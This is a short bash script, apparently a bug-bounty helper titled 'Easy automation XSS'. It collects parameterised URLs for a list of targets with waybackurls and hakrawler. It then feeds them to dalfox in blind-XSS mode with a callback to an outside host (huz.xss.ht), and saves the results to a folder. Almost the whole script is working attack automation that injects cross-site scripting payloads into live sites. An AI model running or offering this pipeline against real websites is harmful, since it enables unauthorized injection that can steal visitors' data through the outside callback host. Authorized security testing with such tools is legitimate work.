#!/bin/bash
logo(){
echo "   Easy automation XSS";
}
logo
#Gather allurls
gather_js(){
echo -e "\n\e[36m[\e[32m+\e[36m]\e[92m Getting urls for XSS\e[0m\n";
cat $target | waybackurls >>  wayback.txt
cat $target | hakrawler -depth 1 -plain >> spider.txt
cat wayback.txt >> all.txt
cat spider.txt >> all.txt
cat all.txt  | grep "=" | dalfox pipe -blind https://huz.xss.ht >> dalfox_result.txt
}
#Save in Output Folder
output(){
mkdir -p $dir
mv all.txt dalfox_result.txt spider.txt wayback.txt $dir/
}
while getopts ":l:esmwo:" opt;do
        case ${opt} in
                l ) target=$OPTARG
                    gather_js
                    ;;
                o ) dir=$OPTARG
                    output
                    ;;
                \? ) echo "Usage: "
                     echo "       -l   Gather files for XSS";
                     ;;
                : ) echo "Invalid Options $OPTARG require an argument";
                    ;;
        esac
done
shift $((OPTIND -1))